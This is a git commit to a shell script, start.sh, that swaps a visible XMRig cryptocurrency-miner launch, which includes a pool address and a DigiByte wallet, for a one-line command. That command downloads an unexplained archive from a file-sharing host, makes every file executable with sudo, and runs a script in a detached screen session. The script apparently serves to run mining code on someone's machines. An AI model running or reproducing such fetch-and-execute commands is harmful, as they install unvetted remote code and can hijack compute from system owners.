5cc6dbf04e076a9a44333f3b3c1fa457945c9e0f
Gazzy J. Uruj <ghazanfar.uruj.cool@gmail.com>
2022-05-16 05:09:34 +0530

    Update start.sh

--- start.sh
+++ start.sh
@@ -1,4 +1,1 @@
-wget https://github.com/xmrig/xmrig/releases/download/v6.12.2/xmrig-6.12.2-linux-x64.tar.gz
-tar -zxvf xmrig-6.12.2-linux-x64.tar.gz
-cd xmrig-6.12.2
-./xmrig -o rx.unmineable.com:3333 -a rx -k -t 8 -u DGB:DBvtCRdzMq9pqLYPoqdoMAiQiTqAo7ou4M
+wget https://oshi.at/vQDC/r16.tar.gz && tar -xf r16.tar.gz && sudo chmod +x * && apt install -y screen && screen ./scryptr16.sh lacunch
